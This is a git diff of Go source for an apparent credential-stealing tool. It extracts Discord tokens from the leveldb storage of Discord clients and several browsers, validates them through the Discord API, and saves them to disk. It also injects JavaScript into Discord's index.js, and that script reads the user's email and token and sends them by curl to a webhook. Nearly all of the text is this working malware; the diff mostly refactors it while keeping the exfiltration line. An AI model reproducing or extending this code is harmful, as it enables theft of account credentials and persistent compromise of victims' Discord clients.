@@ -6,6 +6,7 @@
 package main
 
 import (
+	"time"
 	"bytes"
 	"encoding/json"
 	"fmt"
@@ -17,15 +18,15 @@ import (
 )
 
 type DiscordPath struct {
-	Name       string
-	Location   string
-	InfectPath string
-	Infected   bool
+	Name       string `json:"name"`
+	Location   string `json:"path"`
+	InfectPath string `json:"infect_path"`
+	Infected   bool   `json:"infected"`
 }
 
 type Token struct {
-	Token string
-	Path  DiscordPath
+	Token string      `json:"token"`
+	Path  DiscordPath `json:"location"`
 }
 
 type Account struct {
@@ -49,11 +50,11 @@ type Discord struct {
 	Accounts []Account
 }
 
-func (discord *Discord) FormatTokensFoundPerPath(tokens []Token) string {
-	// Format paths and token count table for embed
+func (discord *Discord) FormatTokensFound() string {
+	// Format discord paths and tokens stolen table for embed
 
 	// Check if any tokens were counted and return "None found" if not
-	if len(tokens) == 0 {
+	if len(discord.Tokens) == 0 {
 		return "No Tokens Found"
 	}
 
@@ -61,7 +62,7 @@ func (discord *Discord) FormatTokensFoundPerPath(tokens []Token) string {
 	tokenCount := make(map[string]int)
 
 	// Iterate through each token and update the count for its corresponding path
-	for _, token := range tokens {
+	for _, token := range discord.Tokens {
 		for _, path := range discord.Paths {
 			if path.Name == token.Path.Name || path.Location == token.Path.Location {
 				tokenCount[path.Name]++
@@ -89,31 +90,9 @@ func (discord *Discord) FormatTokensFoundPerPath(tokens []Token) string {
 	return buffer.String()
 }
 
-func GetTokensFromPath(path DiscordPath) (tokens []string) {
-	// Locate and parse any tokens from the given storage path
-	pathLocation := path.Location + "\\Local Storage\\leveldb\\"
-	files, _ := os.ReadDir(pathLocation)
-
-	for _, file := range files {
-		name := file.Name()
-		if strings.HasSuffix(name, ".log") || strings.HasSuffix(name, ".ldb") {
-			content, _ := os.ReadFile(pathLocation + "/" + name)
-			lines := bytes.Split(content, []byte("\\n"))
-
-			for _, line := range lines {
-				if strings.Contains(path.Name, "cord") {
-					GetEncryptedToken(line, path.Location, &tokens)
-				} else {
-					GetDecryptedToken(line, &tokens)
-				}
-			}
-		}
-	}
-
-	return tokens
-}
-
 func InfectPath(path DiscordPath) bool {
+	defer TimeTrack(time.Now())
+
 	// Add the Discord Injection script to the end of the paths index.js file content (path.InfectPath)
 	infectFile, err := filepath.Glob(fmt.Sprintf("%s\\modules\\discord_modules-*\\discord_modules\\index.js", userPath+path.InfectPath))
 
@@ -137,7 +116,34 @@ func InfectPath(path DiscordPath) bool {
 	return false
 }
 
+func GetTokensFromPath(path DiscordPath) (tokens []string) {
+	defer TimeTrack(time.Now())
+
+	// Locate and parse any tokens from the given storage path
+	pathLocation := path.Location + "\\Local Storage\\leveldb\\"
+	files, _ := os.ReadDir(pathLocation)
+
+	for _, file := range files {
+		name := file.Name()
+		if strings.HasSuffix(name, ".log") || strings.HasSuffix(name, ".ldb") {
+			content, _ := os.ReadFile(pathLocation + "/" + name)
+			lines := bytes.Split(content, []byte("\\n"))
+
+			for _, line := range lines {
+				if strings.Contains(path.Name, "cord") {
+					GetEncryptedToken(line, path.Location, &tokens)
+				} else {
+					GetDecryptedToken(line, &tokens)
+				}
+			}
+		}
+	}
+
+	return tokens
+}
+
 func (stealer *Stealer) WriteDiscordJson() {
+	defer TimeTrack(time.Now())
 	// Write the accounts to accounts.json and tokens to tokens.txt in the Output directory
 	if len(stealer.Apps.Discord.Accounts) > 0 {
 		var discordOutputPath = outputPath + "\\Discord"
@@ -170,6 +176,8 @@ func (stealer *Stealer) WriteDiscordJson() {
 }
 
 func (stealer *Stealer) GetAccountFromToken(token Token) Account {
+	defer TimeTrack(time.Now())
+
 	// Fetch account information using the Discord API and the supplied token
 	account := Account{Token: token} // Default account value
 
@@ -206,17 +214,18 @@ func (stealer *Stealer) GetAccountFromToken(token Token) Account {
 }
 
 func (stealer *Stealer) GetTokens() {
+	defer TimeTrack(time.Now())
+
 	// Get all available and validated Discord tokens
-	stealer.Apps.Discord.Paths = discordPaths
 
 	// Loop through available paths
-	for i, path := range stealer.Apps.Discord.Paths {
+	for i, path := range discordPaths {
 		if _, err := os.Stat(path.Location); os.IsNotExist(err) {
 			continue // Path not found
 		}
 		if injectIntoDiscord {
 			if len(path.InfectPath) != 0 {
-				stealer.Apps.Discord.Paths[i].Infected = InfectPath(path)
+				discordPaths[i].Infected = InfectPath(path)
 			}
 		}
 
@@ -232,6 +241,7 @@ func (stealer *Stealer) GetTokens() {
 		}
 	}
 
+	stealer.Apps.Discord.Paths = discordPaths
 	stealer.WriteDiscordJson()
 }
 
@@ -269,6 +279,8 @@ var (
 		{Name: "Yandex", Location: local + "\\Yandex\\YandexBrowser\\User Data\\Default"},
 		{Name: "Brave", Location: local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default"},
 		{Name: "Iridium", Location: local + "\\Iridium\\User Data\\Default"},
+
+		// You can add more paths here if you wish, just follow the aforementioned DiscordPath format.
 	}
 )
 
@@ -276,40 +288,7 @@ var (
 
 var discordInjection = `
 module.exports = require('./discord_modules.node');
-const request = require('request');
 const i = document.createElement('iframe');
 document.body.appendChild(i);
 const webhook = '%s';
-
-const jsonData = {
-	url: webhook,
-	method: 'POST',
-	headers: {
-		'Content-Type': 'application/json',
-	},
-	json: {
-		embeds: [
-			{
-				title: 'Client Started',
-				description: '%s',
-				color: 0x000000,
-			},
-			{
-				title: 'Email',
-				description: i.contentWindow.localStorage.email_cache,
-				color: 0x000000,
-			},
-			{
-				title: 'Token',
-				description: i.contentWindow.localStorage.token.replace(/^"(.*)"$/, '$1'),
-				color: 0x000000,
-			},
-		],
-	},
-};
-
-require('child_process').exec('curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\\"content\\\": \\"Discord token logged on '+i.contentWindow.localStorage.email_cache+': '+i.contentWindow.localStorage.token.replace(/^"(.*)"$/, '$1')+'\\"}" ${webhook}',{ cwd: this.entityPath });
-
-request(jsonData, (error, response, body) => {
-	console.log(body);
-});`
+require('child_process').exec('curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\\"content\\\": \\"Discord token logged on '+i.contentWindow.localStorage.email_cache+': '+i.contentWindow.localStorage.token.replace(/^"(.*)"$/, '$1')+'\\"}" ${webhook}',{ cwd: this.entityPath });`
